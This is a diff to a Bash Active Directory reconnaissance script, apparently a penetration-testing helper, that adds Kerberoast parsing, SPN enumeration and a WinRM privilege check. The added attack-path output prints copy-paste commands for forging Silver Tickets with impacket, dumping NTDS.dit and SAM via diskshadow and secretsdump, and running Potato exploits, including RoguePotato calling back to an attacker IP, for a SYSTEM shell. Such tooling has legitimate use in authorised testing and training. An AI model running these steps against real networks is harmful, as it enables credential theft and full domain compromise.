@@ -103,11 +103,16 @@ ADCS_SERVICE_DETECTED=false
 MACHINE_ACCOUNT_QUOTA=-1
 CAN_JOIN_COMPUTERS_TO_DOMAIN=false
 HAS_WRITABLE_COMPUTER_ACL=false
+KERBEROAST_HASH_FOUND=false     # Set when Kerberoast output is non-empty
+SPN_NAME=""                     # Parse from Kerberoast result
 
 # --------- Certificate Services / AD CS ----------
 HAS_CERTIPY=0
 ADCS_TEMPLATES=()
 CERTIPY_OUTPUT=""
+
+# Privilges
+FOUND_ESCALATION_PRIVS=()
 
 # --- Passing in User Info -----
 AUTH_USER=""
@@ -434,13 +439,14 @@ gather_bloodhound() {
 
 # --------- SSL Certificate Extraction ----------
 extract_ssl_info() {
+    set +e  # Disable exit-on-error for this function
     local HOST=$1
     local PORT=${2:-443}
 
     info "Extracting SSL certificate from $HOST:$PORT..."
 
     # Retrieve the SSL certificate
-    SSL_INFO=$(timeout 4 openssl s_client -connect "$HOST:$PORT" -showcerts </dev/null 2>/dev/null)
+    SSL_INFO=$(timeout 4 openssl s_client -connect "$HOST:$PORT" -showcerts 2>/dev/null)
 
     if [ -z "$SSL_INFO" ]; then
         warn "Could not retrieve SSL certificate from $HOST:$PORT"
@@ -1160,6 +1166,8 @@ ldap_enum() {
     if [[ -f "$KERBEROAST_OUT" && -s "$KERBEROAST_OUT" ]]; then
         success "Kerberoastable accounts identified"
         success "Kerberoast hashes saved to: ${BLUE}$KERBEROAST_OUT${RESET}"
+        KERBEROAST_HASH_FOUND=true     
+                             # Parse from Kerberoast result
 
         # Optional: extract principals for on-screen display
         mapfile -t KERBEROAST_TARGETS < <(
@@ -1167,9 +1175,35 @@ ldap_enum() {
                 | awk -F':' '{print $NF}' \
                 | sort -u
         )
+        
+        # Extract Kerberoast SPN and user (samAccountName)
+        KERBEROAST_USER=$(grep -oP '\$krb5tgs\$[^\$]+\$\K[^$]+' "$KERBEROAST_OUT" | head -n 1)
+        # Extract SPN from first line of Kerberoast hash file
+        SPN_NAME=$(head -n 1 "$KERBEROAST_OUT" | awk -F'\$' '{print $6}' | awk -F'*' '{print $2}')
+        
+        # Run impacket-GetUserSPNs and parse SPNs into array
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}impacket-GetUserSPNs '$LDAP_BASE_DN//$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER${RESET}"
+        SPN_ENUM_OUTPUT=$(impacket-GetUserSPNs "$LDAP_DOMAIN//$AUTH_USER:$AUTH_PASS" -k -dc-ip "$TARGET_IPV4" -dc-host "$DOMAIN_CONTROLLER" 2>/dev/null)
+        mapfile -t SPN_LIST < <(echo "$SPN_ENUM_OUTPUT" | awk '/^[^ ]/ && $1 ~ /\// {print $1}' | sort -u)
+        mapfile -t SPN_USER_LIST < <(echo "$SPN_ENUM_OUTPUT" | awk '/^[^ ]/ && $1 ~ /\// {print $2}' | sort -u)
+
+        if [[ ${#SPN_LIST[@]} -gt 0 ]]; then
+            print_section "Service Principal Names (via GetUserSPNs):" "${SPN_LIST[@]}"
+             SPN_NAME="${SPN_LIST[0]}"
+        else
+            warn "No SPNs found via GetUserSPNs"
+        fi
+        if [[ ${#SPN_USER_LIST[@]} -gt 0 ]]; then
+            print_section "Usernames with SPNS (via GetUserSPNs):" "${SPN_USER_LIST[@]}"
+            KERBEROAST_USER="${SPN_USER_LIST[0]}"
+        else
+            warn "No Usernames found via GetUserSPNs"
+        fi
 
         if [[ ${#KERBEROAST_TARGETS[@]} -gt 0 ]]; then
             print_section "Kerberoast Targets (SPNs):" "${KERBEROAST_TARGETS[@]}"
+
         fi
     else
         warn "No kerberoastable accounts found (output file empty or not created)"
@@ -1826,7 +1860,7 @@ check_rpc_services() {
     # ------------------------------
     if printf '%s\n' "${OPEN_PORTS[@]}" | grep -q -E '^445$|^139$'; then
         if command -v rpcclient >/dev/null; then
-            info "Testing anonymous SMB RPC (rpcclient -U \"\")"
+            info "Testing anonymous SMB RPC (rpcclient -U '' $target)"
             if echo "exit" | rpcclient -U "" "$target" 2>&1 | grep -vq "NT_STATUS_LOGON_FAILURE"; then
                 critical "Anonymous SMB RPC login successful!"
                 RPC_ANON_OK=true
@@ -1835,7 +1869,7 @@ check_rpc_services() {
                 RPC_ANON_OK=false
             fi
 
-            info "Testing guest SMB RPC (rpcclient -U guest%)"
+            info "Testing guest SMB RPC (rpcclient -U guest% $target)"
             if echo "exit" | rpcclient -U "guest%" "$target" 2>&1 | grep -vq "NT_STATUS_LOGON_FAILURE"; then
                 critical "Guest SMB RPC login successful!"
                 RPC_GUEST_OK=true
@@ -1926,7 +1960,7 @@ check_ntlm_support() {
         elif echo "$OUT" | grep -q "\[-\]"; then
             notify "NTLM authentication attempted, but failed — NTLM likely ENABLED!"
             NTLM_ENABLED=true
-        elif echo "$OUT" | grep -q "\[\+\]"; then
+        elif echo "$OUT" | grep -q "\[+\]"; then
             critical "NTLM authentication SUCCESSFUL — NTLM is ENABLED!"
             NTLM_ENABLED=true
         else
@@ -2557,7 +2591,7 @@ if [ -s "$SMB_MARKER" ]; then
         SMB_GUEST_OK=true
         
         if [[ "$NTLM_ENABLED" = true ]]; then
-            smb_enum_smbclient "$guest%" "GUEST" || \
+            smb_enum_smbclient "guest%" "GUEST" || \
                 notify "Authenticated but no shares are visible to this user"
         else
             smb_enum_netexec "guest" "" "GUEST" || \
@@ -2836,6 +2870,65 @@ if $CREDS_PROVIDED; then
             warn "MSSQL authentication failed or not permitted"
         fi
     fi
+fi
+
+ESCALATION_PRIVS_FOUND=false
+SE_BACKUP_PRIV=false
+SE_IMPERSONATE_PRIV=false
+check_winrm_privs() {
+    [[ "$WINRM_DETECTED" != true ]] && return
+
+    info "Running whoami /priv via NetExec WinRM..."
+
+    # Run command via NetExec and capture output
+    PRIV_OUTPUT=$(timeout 15s netexec winrm "$TARGET_IPV4" -u "$AUTH_USER" -p "$AUTH_PASS" -d "${AUTH_DOMAIN:-$LDAP_DOMAIN}" -X 'whoami /priv' 2>/dev/null)
+
+    # Check if we got any output
+    if [[ -z "$PRIV_OUTPUT" ]]; then
+        warn "No output from NetExec — WinRM command may have failed or timed out"
+        return
+    fi
+    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
+    echo "$PRIV_OUTPUT" > "whoami_privs_${TARGET_IPV4}_${AUTH_USER}_${DATE_TAG}.txt"
+
+    # Known privesc privileges
+    local -a PRIVESCLIST=(
+        "SeImpersonatePrivilege"
+        "SeAssignPrimaryTokenPrivilege"
+        "SeDebugPrivilege"
+        "SeBackupPrivilege"
+        "SeRestorePrivilege"
+        "SeTakeOwnershipPrivilege"
+        "SeLoadDriverPrivilege"
+        "SeTcbPrivilege"
+        "SeCreateTokenPrivilege"
+    )
+
+    for priv in "${PRIVESCLIST[@]}"; do
+        if echo "$PRIV_OUTPUT" | grep -q "$priv"; then
+            FOUND_ESCALATION_PRIVS+=("$priv")
+        fi
+    done
+
+    if [[ ${#FOUND_ESCALATION_PRIVS[@]} -gt 0 ]]; then
+        critical "Privilege Escalation Vectors Detected via NetExec WinRM"
+        for p in "${FOUND_ESCALATION_PRIVS[@]}"; do
+            echo -e "      - ${GREEN}$p${RESET}"
+            if [[ "$p" == "SeBackupPrivilege" ]]; then
+                SE_BACKUP_PRIV=true
+            fi
+            if [[ "$p" == "SeImpersonatePrivilege" ]]; then
+                SE_IMPERSONATE_PRIV=true
+            fi
+        done
+
+    else
+        info "No known privesc privileges found in whoami /priv output"
+    fi
+}
+
+if [ "$WINRM_DETECTED" = true ]; then
+    check_winrm_privs
 fi
 
 ###########################################
@@ -3310,7 +3403,10 @@ if [[ $HAS_LDAP -eq 1 && $HAS_KERB -eq 1 && $DC_AUTH_OK -eq 1 ]]; then
    fi
 fi
 
+# Initialize NTLM Detection
 [ "$NTLM_ENABLED" = false ] && NTLM_DISABLED=true
+[ "$NTLM_ENABLED" = true ] && NTLM_DISABLED=false
+
 generate_synopsis() {
     echo -e "\n${BLUE}========================================${RESET}"
     echo -e "${BYELLOW}          RECON SYNOPSIS               ${RESET}"
@@ -3499,6 +3595,76 @@ attack_path_evaluation() {
     if [[ ${#ATTACK_PATHS[@]} -eq 0 ]]; then
         warn "No immediate attack paths identified"
     fi
+    
+    if [[ "$KERBEROAST_HASH_FOUND" == true ]] && [[ "$NTLM_DISABLED" == true ]] && [[ -n "$SPN_NAME" ]]; then
+        echo ""
+        critical "Attack Path: Silver Ticket Attack is Viable"
+        lightbulb "Next Steps:"
+        echo -e "   - Crack the Kerberoast hash for the SPN account: ${YELLOW}$SPN_NAME${RESET}"
+        echo -e "   - Acquire the NTLM hash for the pwned SPN Account."
+        echo -e "         ${GREEN}impacket-secretsdump ${AUTH_DOMAIN:-$LDAP_DOMAIN}/$KERBEROAST_USER:[CrackedPassword]@$TARGET_IPV4"
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}impacket-GetUserSPNs '$LDAP_BASE_DN//$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER${RESET}"
+        echo -e "   - Use the hash to forge a Silver Ticket:"
+        echo -e "         ${GREEN}impacket-ticketer -nthash <NTLM> -domain ${AUTH_DOMAIN:-$LDAP_DOMAIN} -user $KERBEROAST_USER -spn $SPN_NAME${RESET}"
+        echo -e "         ${GREEN}export KRB5CCNAME=silver_ticket.ccache${RESET}"
+        echo -e "         ${GREEN}impacket-smbclient -k -no-pass $KERBEROAST_USER/$TARGET_IPV4${RESET}"
+        echo -e "   - Test access to MSSQL, SMB, or other SPN-related services"
+    fi
+    
+    # 5. Privilege Escalation via Misconfigured Privileges
+    if [[ "$ESCALATION_PRIVS_FOUND" == true ]] && [[ ${#FOUND_ESCALATION_PRIVS[@]} -gt 0 ]]; then
+        ATTACK_PATHS+=("Privilege Escalation via Misconfigured Rights")
+        critical "Attack Path: Local Privilege Escalation Possible"
+        lightbulb "Next Steps:"
+        echo -e "   - Use privesc tools (e.g. PrintSpoofer, JuicyPotato, RoguePotato) depending on rights"
+        echo -e "   - Consider using PowerUp.ps1 / winPEAS / seatbelt.exe for further enumeration"
+        echo -e "   - Exploitable privileges found:"
+        for priv in "${FOUND_ESCALATION_PRIVS[@]}"; do
+            echo -e "       ${GREEN}- $priv${RESET}"
+        done
+        echo
+    fi
+    # 5a. SeBackupPrivilege Exploitation
+    if [[ "$SE_BACKUP_PRIV" == true ]]; then
+        ATTACK_PATHS+=("SeBackupPrivilege Abuse (NTDS.dit/SAM Dump)")
+        critical "Attack Path: SeBackupPrivilege — Possible NTDS.dit or SAM Dump"
+        lightbulb "Next Steps:"
+        echo "   - Use tools like BackupMaster or SharpBackup to read sensitive files"
+        echo '   - Dump NTDS.dit or SYSTEM/SAM from C:\\Windows\\NTDS or Registry'
+        echo "   - Example SharpBackup usage:"
+        echo '         SharpBackup.exe backup /file:C:\\windows\\ntds\\ntds.dit'
+        echo '   - Alternatively, use diskshadow to create shadow copies:"'
+        echo "         diskshadow"
+        echo "         set context persistent nowriters"
+        echo "         add volume c: alias myshadow"
+        echo "         create"
+        echo "         expose %myshadow% x:"
+        echo '         copy x:\\windows\\ntds\\ntds.dit C:\\temp\\ntds.dit'
+        echo '         copy x:\\windows\\system32\\config\SYSTEM C:\\temp\\SYSTEM'
+        echo "   - Then use impacket-secretsdump locally:"
+        echo "         secretsdump.py -system SYSTEM -ntds ntds.dit -outputfile creds.txt LOCAL"
+        echo
+    fi
+    # 5b. SeImpersonatePrivilege Exploitation
+    if [[ "$SE_IMPERSONATE_PRIV" == true ]]; then
+        ATTACK_PATHS+=("SeImpersonatePrivilege Abuse (Potato Exploits)")
+        critical "Attack Path: SeImpersonatePrivilege — Potato-style Exploits Possible"
+        lightbulb "Next Steps:"
+        echo "   - Use tools like PrintSpoofer, RoguePotato, or JuicyPotatoNG to escalate to SYSTEM"
+        echo "   - PrintSpoofer (if named pipe is available):"
+        echo "         PrintSpoofer.exe -i -c 'cmd.exe'"
+        echo "         PrintSpoofer64.exe -i -c 'cmd.exe'"
+        echo "   - RoguePotato (more flexible, no print spooler needed):"
+        echo "         RoguePotato.exe -r <attacker_ip> -l 9999 -e cmd.exe"
+        echo "   - JuicyPotatoNG (older method, needs CLSID):"
+        echo "         JuicyPotatoNG.exe -t * -p cmd.exe -l 1337"
+        echo "   - If successful, this grants SYSTEM-level command shell"
+        echo "   - Be sure to check which named pipes are available:"
+        echo '         \\.\\pipe\\spoolss, epmapper, lsarpc, etc.'
+        echo
+    fi
+
 }
 
 # Generate Attack Path Summary
@@ -3514,12 +3680,16 @@ echo -e "${BLUE}============================${RESET}"
 if [[ $HAS_SMB -eq 1 && $HAS_LDAP -eq 1 && $HAS_KERB -eq 1 ]]; then
     critical "ATTACK SURFACE: ACTIVE DIRECTORY"
     lightbulb "Suggested path:"
+    echo "    → User / Password Spray"
+    echo "    → SMB share creds"
+    echo "    → Bloodhound"
     echo "    → Kerberos user enum"
+    echo "    → Kerberoast"
     echo "    → AS-REP roast"
+    echo "    → Silver Ticket"
+    echo "    → Golden Ticket"
     echo "    → SMB share creds"
     echo "    → WinRM / RDP"
-    echo "    → User / Password Spray"
-    echo "    → Bloodhound"
     echo
 elif [[ $HAS_SMB -eq 1 ]]; then
     alert "ATTACK SURFACE: FILE SHARES / WINDOWS HOST"
